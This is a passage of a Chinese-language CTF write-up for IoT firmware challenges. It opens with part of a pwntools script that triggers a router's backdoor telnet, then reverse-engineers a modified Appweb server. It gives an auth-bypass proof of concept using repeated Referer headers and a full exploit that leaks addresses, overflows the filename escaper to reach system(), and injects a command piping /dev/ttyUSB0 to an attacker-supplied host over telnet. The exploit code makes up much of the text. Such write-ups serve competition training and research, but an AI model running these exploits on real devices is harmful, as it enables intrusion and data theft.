    headers = {“Accept”:”*/*”,”User-Agent”:”Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36″,”Connection”:”close”,”Accept-Encoding”:”gzip, deflate”,”Accept-Language”:”zh-CN,zh;q=0.9″}

    response = session.get(“http://{}/luci-static/resources/luci.js”.format(ip), params=paramsGet, headers=headers)

    date_str = response.headers[‘Date’]

    date = datetime.datetime.strptime(date_str, ‘%a, %d %b %Y %H:%M:%S %Z’)

    digits = str(date).replace(‘-‘, ”).replace(‘:’, ”).replace(” “, “”)

    time = digits[4:4+8]

    return time

class ophelper(remote):

    def _send_str(self, s):

        self.send(bytes([len(s)]) + s)

    def open_telnet(self, password,ip,port):

        log.info(“sending zh1makaim3n…”)

        self._send_str(b”zh1makaim3n”)

        self.recvuntil(“seedNum:”)

        challenge = self.recv(8).decode()

        log.info(“received seedNum:{}”.format(challenge))

        log.info(“using time key {}”.format(password))

        key = challenge + password

        log.info(“initializing (modified) 3des with key {}”.format(key))

        k = triple_des(key, ECB, padmode=PAD_PKCS5, hs=True)

        enc_chal = k.encrypt(challenge)

        self._send_str(b”seedNum:” + enc_chal)

        self.recvuntil(“Check:”)

        assert self.recv(2) == b”OK”

        log.success(“Check:OK”)

        log.info(“sending encrypted command G1vemey0ur5he11!…”)

        self._send_str(b”Req:” + k.encrypt(“G1vemey0ur5he11!”))

        self.recvuntil(“Open:”)

        assert self.recv(2) == b”OK”

        log.success(“Open:OK”)

        self._send_str(ip.encode() + b”:” + port.encode())

p = argparse.ArgumentParser()

p.add_argument(“host”)

p.add_argument(“ip”)

p.add_argument(“port”)

args = p.parse_args()

att = ophelper(args.host, 8783)

password = get_time(args.host)

att.open_telnet(password,args.ip,args.port)

ahttpd

其打开页面可以看到是Appweb的服务器，且主要为upload的功能点。

可以逐步确定为Appweb 3.X的版本后，因为appweb之前是开源的，在github搜索即可获取相关的源代码，如：

https://github.com/doghell/appweb-3

https://github.com/ly-web/appweb3

接着可以进行本地编译，留作diff及恢复符号表等操作使用。

可以先对题目的appweb.conf与模版conf进行diff：

47c47

< DocumentRoot “/var/appweb-www”

—

> DocumentRoot “/var/www/appweb-default”

66c66

< LoadModulePath “/usr/bin”

—

> LoadModulePath “/usr/lib/appweb/modules”

116,132d115

< 

<

<     LoadModule uploadFilter mod_upload

<     UploadDir /tmp

<     UploadAutoDelete off

<     AddInputFilter uploadFilter

<

< 

<

<     LoadModule egiHandler mod_egi

<     AddHandler egiHandler egi

<

< 

< 

< 

< 

< 

151,152c134,136

< Group root

< User root

—

> Group nogroup

> User nobody

> 

174,190c158,174

<            AuthMethod file 

<            AuthGroupFile groups.db

<            AuthUserFile users.db

<            AuthDigestQop auth

<     

<           

<                AuthType basic

<                AuthName “Acme Inc”

<                Require valid-user

<           

<

<                AuthType basic

<                AuthName “Acme Inc”

<                Require valid-user

<           

<    

< 

—

>     #       AuthMethod file 

>     #       AuthGroupFile groups.db

>     #       AuthUserFile users.db

>     #       AuthDigestQop auth

>     #

>     #       

>     #           AuthType basic

>     #           AuthName “Acme Inc”

>     #           Require valid-user

>     #       

>     #

>     #       

>     #           AuthType digest

>     #           AuthName “Acme Inc”

>     #           Require valid-user

>     #       

>     #

可以分析获取到关键点：

• 增加了2个新的moudle的处理，其为mod_upload mod_egi

• 权限点从nobody 到 root

• 增加了用户认证，在/upload及/basic下触发，认证模式为basic

在index页面点击upload时，需要进行用户认证，认证完成后，则是一个文件上传的操作。所以关键点应该就在用户认证绕过及upload功能点的漏洞。

在使用:

appweb –log stdout:9 –config /etc/appweb/appweb.conf

会显示更多的debug信息方便调试。

先从用户认证绕过进行分析,在用户认证时，会出现log：

appweb: 4: TIME: netConnector.open elapsed 0 msec

appweb: 4: TIME: chunkFilter.open elapsed 0 msec

appweb: 4: TIME: authFilter.open elapsed 0 msec

appweb: 4: TIME: passHandler.open elapsed 0 msec

appweb: 4: TIME: passHandler.run elapsed 0 msec

可以关注到authFilter，且定位到mod_auth.so。

int __fastcall maAuthFilterInit(int a1)

{

int result; // $v0

int v2; // [sp+20h] [+20h]

int v3; // [sp+24h] [+24h]

v2 = mprCreateModule(a1, “authFilter”, “3.4.0”, 0, 0, 0, 115344);

if ( !v2 )

  return 0;

  v3 = maCreateFilter(a1, “authFilter”, 127);

  if ( v3 )

    {

    *(_DWORD *)(a1 + 88) = v3;

    *(_DWORD *)(v3 + 16) = sub_B3C;

    *(_DWORD *)(v3 + 8) = sub_23A8;

    result = v2;

    }

  else

    {

    mprFree(v2);

    result = 0;

    }

    return result;

    }

注意到关键函数sub_B3C，此函数对用户进行匹配授权请求。实现了基本和摘要身份验证。

int __fastcall sub_B3C(int a1)

{

  int v2; // $v0

  int v3; // $v1

  int v4; // [sp+38h] [+38h]

  int v5; // [sp+3Ch] [+3Ch]

  int v6; // [sp+40h] [+40h]

  int v7; // [sp+44h] [+44h]

  int v8; // [sp+48h] [+48h]

  char v9[4]; // [sp+4Ch] [+4Ch] BYREF

  int v10; // [sp+50h] [+50h] BYREF

  v6 = *(a1 + 32);

  v7 = *(v6 + 192);

  if ( !v7 )

  {

    maFailRequest(a1, 401, “Access Denied, Authorization enabled.”);

    return 1;

  }

  v2 = mprAllocZeroed(v6, 36);

  v8 = mprSetName(v2, “authFilter.c:65”);

  if ( !v8 )

  {

    maFailRequest(a1, 401, “Access Denied, Server Error.”);

    return 1;

  }

  if ( !*(v7 + 8) )

  {

    sub_2DD4(a1, v7, 401, “Access Denied, Authorization required.”, 0);

    return 1;

  }

  if ( !*(v6 + 144) )

  {

    sub_2DD4(a1, v7, 401, “Access Denied, Missing authorization details.”, 0);

    return 1;

  }

  if ( mprStrcmpAnyCase(*(v6 + 148), “basic”) )

  {

    if ( mprStrcmpAnyCase(*(v6 + 148), “digest”) )

    {

      v5 = 0;

    }

    else

    {

      if ( sub_16B0(a1, v8) < 0 )

      {

        maFailRequest(a1, 400, “Bad authorization header”);

        return 1;

      }

      v5 = 2;

    }

  }

  else

  {

    sub_140C(a1, v8);

    v5 = 1;

  }

  mprLog(a1, 4, “openAuth: type %d, url %snDetails %sn”, *(v7 + 8), *(v6 + 72), *(v6 + 144));

  if ( !*(v8 + 4) )

  {

    sub_2DD4(a1, v7, 401, “Access Denied, Missing user name.”, 0);

    return 1;

  }

  if ( v5 != *(v7 + 8) )

  {

    sub_2DD4(a1, v7, 401, “Access Denied, Wrong authentication protocol.”, 0);

    return 1;

  }

  v4 = sub_1364(a1, *(v7 + 32), *(v8 + 4));

  if ( !v4 )

  {

    sub_2DD4(a1, v7, 401, “Access Denied, authentication error.”, “User not defined”);

    return 1;

  }

  if ( *(v7 + 8) == 2 )

  {

    if ( strcmp(*(v8 + 24), *(v7 + 28)) )

    {

      sub_2DD4(a1, v7, 401, “Access Denied, Quality of protection does not match.”, 0);

      return 1;

    }

    mprCalcDigest(v6, &v10, 0, v4, *(v8 + 28), *(v6 + 72), *(v8 + 16), *(v8 + 24), *(v8 + 12), *(v8 + 8), *(v6 + 64));

    v4 = v10;

  }

  if ( sub_1288(a1, *(v7 + 32), *(v8 + 4), *v8, v4, v9) )

    v3 = *(v6 + 248) + 1;

  else

    v3 = *(v6 + 248) – 1;

  *(v6 + 248) = v3;

  if ( *(v6 + 248) >= 2 )

    return 0;

  sub_2DD4(a1, v7, 401, “Access denied.”, 0);

  return 1;

}

会发现在认证信息不正确时，会return 1 ，正确时return 0。

所以要注意关键的部分：

if ( sub_1288(a1, *(v7 + 32), *(v8 + 4), *v8, v4, v9) )

    v3 = *(v6 + 248) + 1;

  else

    v3 = *(v6 + 248) – 1;

  *(v6 + 248) = v3;

  if ( *(v6 + 248) >= 2 )

    return 0;

就是当*(v6 + 248) >= 2时，即可返回认证通过，可以根据源代码、编译出的程序或者一号固件的jailbreak 的appweb来进行符号恢复及结构体修正（MaRequest结构体下在最后新增了int auth_check_count; ）。

if ( validateUserCredentials(conn, auth->requiredRealm, ad->userName, ad->password, requiredPassword, &msg) )

    v5 = req->auth_check_count + 1;

else

    v5 = req->auth_check_count – 1;

req->auth_check_count = v5;

if ( req->auth_check_count >= 2 )

    return 0;

validateUserCredentials函数为使用指定的授权后端方法验证用户凭据。

当认证通过就将req->auth_check_count进行加一，且req->auth_check_count>=2时，就通过用户校验。

但并不知道req->auth_check_count的初始值，应确定其初始值，且看看别的地方没有代码对req->auth_check_count值的操作。

在libappweb.so库中，找到parseRequest函数，该函数用来解析所有的http请求，conn为socket连接的对象，packet为数据包的指针结构：

bool __cdecl parseHeaders(MaConn_0 *conn, MaPacket_0 *packet)

{

    /*

Omit some codes

    */

req = conn->request;

  host = req->host;

  content = packet->content;

  req->headerPacket = packet;

  limits = &conn->http->limits;

  keepAlive = 0;

  req->auth_check_count = 0;

可以看到起初始化值为0，若只通过认证req->auth_check_count也只是1，无法>=2，应该找别的代码操作值的部分。

case ‘R’:

            if ( !strcmp(key, “RANGE”) )

            {

              if ( !parseRange(conn, value) )

                maFailRequest(conn, 416, “Bad range”);

            }

            else if ( !strcmp(key, “REFERER”) )

            {

              req->referer = value;

              if ( strstr(value, “.html”) )

                ++req->auth_check_count;

            }

            break;

跟着parseHeaders函数往下看，比较了各个请求头的内容，当请求头存在REFERER时，其会对REFERER的value进行检查是否包含“.html”，若存在就将进行  ++req->auth_check_count;，所以可以明白需要通过用户认证和REFERER的字段中，需包含”.html”，就可以通过认证到达upload的页面。

但在这个流程中，是存在一个问题的。当parseHeaders函数对header进行解析时:

while ( *content->start != 13 && !conn->connectionFailed )

  {

    if ( count >= limits->maxNumHeaders )

    {

      maFailConnection(conn, 400, “Too many headers”);

      return 0;

    }

    key = getToken(conn, “:”);

    if ( !key || !*key )

    {

      maFailConnection(conn, 400, “Bad header format”);

      return 0;

    }

    for ( value = getToken(conn, (cchar *)&off_37C48); _isspace_2(*value); ++value )

      ;

    if ( !conn->requestFailed )

    {

      mprStrUpper(key);

      for ( cp = key; *cp; ++cp )

      {

        if ( *cp == 45 )

          *cp = 95;

      }

      mprLog(req, 8, “Key %s, value %s”, key, value);

      if ( strspn(key, “%<>/\”) )

      {

        maFailConnection(conn, 400, “Bad header key value”);

      }

      else

      {

        mprStrcpy(&keyBuf[5], 1019, key);

        mprAddDuplicateHash(req->headers, keyBuf, value);

        switch ( *key )

        {

          case ‘A’:

            if ( !strcmp(key, “AUTHORIZATION”) )

            {

              v3 = mprStrdup(req, value);

              valuea = (char *)mprSetName(v3, “request.c:
399”);

              req->authType = (char *)mprStrTok(valuea, &off_37DAC, &tok);

              req->authDetails = tok;

            }

        /*

Omit some codes

*/

          case ‘R’:

            if ( !strcmp(key, “RANGE”) )

            {

              if ( !parseRange(conn, value) )

                maFailRequest(conn, 416, “Bad range”);

            }

            else if ( !strcmp(key, “REFERER”) )

            {

              req->referer = value;

              if ( strstr(value, “.html”) )

                ++req->auth_check_count;

            }

            break;

         /*

Omit some codes

*/

          default:

            break;

        }

      }

    }

    ++count;

  }

其是通过while循环，进行逐行解析的，且不会过滤header中重复的字段。所以传递多次REFERER，也会被解析，若都包含”.html”,都会使得 ++req->auth_check_count;

回到matchAuth函数，需要注意：

if ( !auth->type )

  {

    formatAuthResponse(conn, auth, 401, “Access Denied, Authorization required.”, 0);

    return 1;

  }

  if ( !req->authDetails )

  {

    formatAuthResponse(conn, auth, 401, “Access Denied, Missing authorization details.”, 0);

    return 1;

  }

  if ( mprStrcmpAnyCase(req->authType, “basic”) )

  {

    if ( mprStrcmpAnyCase(req->authType, “digest”) )

    {

      actualAuthType = 0;

    }

    else

    {

      if ( decodeDigestDetails(conn, ad) < 0 )

      {

        maFailRequest(conn, 400, “Bad authorization header”);

        return 1;

      }

      actualAuthType = 2;

    }

  }

  else

  {

    decodeBasicAuth(conn, ad);

    actualAuthType = 1;

  }

  mprLog(conn, 4, “openAuth: type %d, url %snDetails %sn”, auth->type, req->url, req->authDetails);

  if ( !ad->userName )

  {

    formatAuthResponse(conn, auth, 401, “Access Denied, Missing user name.”, 0);

    return 1;

  }

  if ( actualAuthType != auth->type )

  {

    formatAuthResponse(conn, auth, 401, “Access Denied, Wrong authentication protocol.”, 0);

    return 1;

  }

  requiredPassword = getPassword(conn, auth->requiredRealm, ad->userName);

  if ( !requiredPassword )

  {

    formatAuthResponse(conn, auth, 401, “Access Denied, authentication error.”, “User not defined”);

    return 1;

  }

其对于Authorization字段也进行了一定的限制，如正确的username等。

在/etc/appweb/users.db中，可以看到账户密码的信息，在appweb模版中的用户为joshua，注意其中有个debug用户。

#

#users.db — Use httpPassword to create.

#

#Fields: Enable/Disable: UserName: Realm: Password

#

#Example:

1: joshua: Acme Inc: 3cc654d84f2b4361fe45a0c92e3f0e0b

2: debug: Acme Inc: 5ca456d73f8d4369f245a09921330d1b

所以可以构造出通过用户认证的poc

POC

GET /upload/upload.html HTTP/1.1

Host: 10.211.55.7:
7777

Cache-Control: max-age=0

Authorization: Basic am9zaHVhOmRhc2Rhc2Q=

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

Accept-Encoding: gzip, deflate

Accept-Language: zh-CN,zh;q=0.9

REFERER: .html

REFERER: .html

REFERER: .html

Connection: close

接着到上传页面，其路由为 “/upload/upload.egi”.

先从路由开始：

❯ grep “/upload/upload.egi” -nr

Binary file modules/mod_egi.so matches

会定位到mod_egi.so中。

int __fastcall sub_23B4(int a1)

{

    maDefineEgiForm(a1, “/upload/upload.egi”, sub_1FE4);

    return 0;

}

分析sub_1FE4函数的关键部分：

else

  {

    maWrite(a1, “egiProgram: EGI Outputrn”);

    sub_14B8(a1);

    sub_16F8(a1);

    sub_1994(a1);

    maWrite(a1, “rn”);

  }

其中会进行一部分信息的输出，在sub_14B8函数：

if ( !strcmp(*(*(*(a1 + 8) + 32) + 160), “debug”) )

    {

      if ( *(v5 + 8) )

        v2 = *(v5 + 8);

      else

        v2 = &unk_2898;

      maWrite(a1, “

%s= *%p -> %s

rn”, *(v5 + 4), *(v5 + 8), v2);

    }

    else

    {

      if ( *(v5 + 8) )

        v3 = *(v5 + 8);

      else

        v3 = &unk_2898;

      maWrite(a1, “

%s=%s

rn”, *(v5 + 4), v3);

    }

  }

会发现在某个字段为“debug”时，会输出不一样的信息。可以猜想为username的字段。

经过构造的debug用户进行上传数据时，会发现显示了数据对应的指针地址，这就完成了地址的泄漏，也可以猜想到接下来时需要找一个溢出漏洞的。

b’egiProgram: EGI Outputrn’

b’

Request Headers

rn’

b’

SCRIPT_FILENAME= *0x454220 -> /var/www/appweb-default/upload/upload.egi

rn’

b’

SERVER_PROTOCOL= *0x7f6efbe0 -> http

rn’

b’

HTTP_CONTENT_LENGTH= *0x5099be -> 613

rn’

b’

HTTP_USER_AGENT= *0x509802 -> Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36

rn’

记得开始diff conf分析到，新增了mod_upload模块，对其进行分析：

int __fastcall maUploadFilterInit(int a1)

{

  int result; // $v0

  int v2; // [sp+20h] [+20h]

  _DWORD *v3; // [sp+24h] [+24h]

  v2 = mprCreateModule(a1, “uploadFilter”, “3.4.0”, 0, 0, 0, 114880);

  if ( !v2 )

    return 0;

  v3 = (_DWORD *)maCreateFilter(a1, “uploadFilter”, 127);

  if ( v3 )

  {

    v3[4] = sub_DDC;

    v3[2] = sub_3388;

    v3[5] = sub_F48;

    v3[6] = sub_1218;

    v3[11] = sub_1318;

    system(“sleep 1”);

    result = v2;

  }

  else

  {

    mprFree(v2);

    result = 0;

  }

  return result;

}

对这几个关键filter函数进行分析，由于要考虑溢出漏洞，所以可以多注意上传包中可以控制的字段，如“filename,name”等，在历史cve中，这些字段也容易在解析时出现问题。

经逆向或diff，可以在incomingUploadData的processContentHeader（sub_1B34）函数下找到关键点：

//sub_1B34：

while ( v10 && mprStrTok(v10, “;rn”, &v17) )

      {

        v11 = mprStrTrim(v10, ” “);

        mprStrTok(v11, &off_3CE4, v18);

        v18[0] = mprStrTrim(v18[0], &unk_3CE8);

        if ( mprStrcmpAnyCase(v11, “form-data”) )

        {

          if ( mprStrcmpAnyCase(v11, “name”) )

          {

            if ( !mprStrcmpAnyCase(v11, “filename”) )

            {

              if ( !v14[7] )

              {

                maFailRequest(v12, 400, “Bad upload state. Missing name field.”);

                return -7;

              }

              mprFree(v14[5]);

              sub_C50((char *)v18[0], v12);

char *__fastcall sub_C50(char *a1, int a2)

{

  int v3; // $v0

  int v4; // $v0

  int v5; // [sp+18h] [+18h]

  int i; // [sp+1Ch] [+1Ch]

  int v7; // [sp+20h] [+20h]

  char v8[84]; // [sp+24h] [+24h] BYREF

  v7 = strlen(a1);

  if ( v7 >= 81 )

    return (char *)maFailRequest(a2, 400, “The length of filename is too long”);

  v5 = 0;

  for ( i = 0; i < v7; ++i )

  {

    if ( a1[i] == ‘/’ )

    {

      v3 = v5++;

      v8[v3] = ‘\’;

    }

    v4 = v5++;

    v8[v4] = a1[i];

  }

  strncpy(a1, v8, v7 + v5);

  return a1;

}

找到关键的sub_C50函数，其会对filename进行check，若存在”/”，就在其前面加上””，来防止路径穿越等问题，最后会存放在固定buf的v8下。虽然在开始对filename的字段值长度进行了检查，其每遇到”/”就增加””,若多次出现”/”，就可能造成溢出，且长度可以过check。

结合debug用户上传数据泄漏的地址，及该module 存在的溢出漏洞且包含了system函数，即可完成攻击。

（泄漏的数据地址中，其中GATEWAY_INTERFACE、REQUEST_TRANSPOR、AUTH_ACL、SERVER_SOFTWARE等等均为非heap地址，根据偏移可以获得systen地址。）

EXP

from pwn import *

import argparse

context.log_level = ‘debug’

def run(ip,my_host,my_port):

    buf = “aaaa”

    headers = {

        “Content-Type”: “multipart/form-data; boundary=—-WebKitFormBoundaryziRjHhPZGlZ56VX8”,

        “User-Agent”: “Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36”,

        “Accept”: “text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9”,

        “Referer”: “.html”,

        ‘Origin’: buf,

        “Authorization”: “Basic ZGVidWc6ZGVidWc=”,

        “Accept-Encoding”: “gzip, deflate”,

        “Accept-Language”: “zh-CN,zh;q=0.9”,

    }

    filename = b”aaaa”

    post_data = {

        “MAX_FILE_SIZE”: “300000000”,

        “Name”: “buf”,

        “Address”: buf,

        “photo”: buf,

    }

    body = b””

    for name, value in post_data.items():

        body += f’——WebKitFormBoundaryziRjHhPZGlZ56VX8rn’.encode()

        body += b’Content-Disposition: form-data; name=”‘ + name.encode() + b'”; filename=”‘ + filename + b'”rn’

        body += f’Content-Type: image/jpegrnrn’.encode()

        body = body + value.encode() + b’rn’

    body += b’——WebKitFormBoundaryziRjHhPZGlZ56VX8–rn’

    conn = remote(‘{}’.format(ip), 7777)

    conn.send(‘POST /upload/upload.egi HTTP/1.1rn’.encode())

    for key, value in headers.items():

        conn.send(f'{key}: {value}rn’.encode())

    conn.send(f’Referer: .htmlrn’.encode())

    conn.send(f’Referer: .htmlrn’.encode())

    conn.send(f’Content-Length: {len(body)}rnrn’.encode())

    conn.send(body)

    resp = conn.recvuntil(“”)

    resp=str(resp)

    conn.close()

    addr = resp[resp.find(“GATEWAY_INTERFACE= *”)+20:
resp.find(“GATEWAY_INTERFACE= *”)+20+11]

    addr = addr.replace(” “,””)

    system_addr = ( int(addr,16) – 0x123094 + 0x00003798)

    print(hex(system_addr))

    headers = {

        “Content-Type”: “multipart/form-data; boundary=—-WebKitFormBoundaryziRjHhPZGlZ56VX8”,

        “User-Agent”: “Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36”,

        “Accept”: “text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9”,

        “Referer”: “.html”,

        “Authorization”: “Basic ZGVidWc6ZGVidWc=”,

        “Accept-Encoding”: “gzip, deflate”,

        “Accept-Language”: “zh-CN,zh;q=0.9”,

    }

    if len(addr) <9:

        ret = p32(0xdeadbeef)

    else:

        ret = p32(system_addr)    

    filename = b”aaaa” + b”/”*30 + cyclic(30-2-4) + ret

    post_data = {

        “MAX_FILE_SIZE”: “300000000”,

        “Name”: “`cat /dev/ttyUSB0|telnet {} {}`”.format(my_host,my_port),

        “Address”: buf,

        “photo”: buf,

    }

    body = b””

    for name, value in post_data.items():

        body += f’——WebKitFormBoundaryziRjHhPZGlZ56VX8rn’.encode()

        body += b’Content-Disposition: form-data; name=”‘ + name.encode() + b'”; filename=”‘ + filename + b'”rn’

        body += f’Content-Type: image/jpegrnrn’.encode()

        body = body + value.encode() + b’rn’

    body += b’——WebKitFormBoundaryziRjHhPZGlZ56VX8–rn’

    conn = remote(‘{}’.format(ip), 7777)

    conn.send(‘POST /upload/upload.egi HTTP/1.1rn’.encode())

    for key, value in headers.items():

        conn.send(f'{key}: {value}rn’.encode())

    conn.send(f’Referer: .htmlrn’.encode())

    conn.send(f’Referer: .htmlrn’.encode())

    conn.send(f’Content-Length: {len(body)}rnrn’.encode())

    conn.send(body)

    resp = conn.recv()

    print(resp)

    conn.close()

parser = argparse.ArgumentParser()

parser.add_argument(“ip”)

parser.add_argument(“my_host”)

parser.add_argument(“my_port”)

if len(sys.argv) == 1:

    parser.parse_args([‘-h’])

args = parser.parse_args()

ip = args.ip

my_host = args.my_host

my_port = args.my_port

run(ip,my_host,my_port)

4

四号固件

四号固件为备份固件，比赛中的赛题暂未放出，因此题目的WriteUp暂不公开。

是安恒信息的智慧大脑，也是信息安全领域前沿技术研究部门。拥有数百位安全研究员和技术研发。目前设有十大实验室，研究领域涉及数十个方向，为公司产品、服务持续赋能，提供专业的技术能力支撑。

网络安全研究宅基地

扫码关注我们

一群技术宅

---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/03/8-1679969821.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/03/3-1679969822.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/03/5-1679969822.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/03/7-1679969823.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/03/6-1679969823.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/03/5-1679969823.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/03/3-1679969824.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/03/2-1679969825.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/03/10-1679969825.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/03/5-1679969826.png)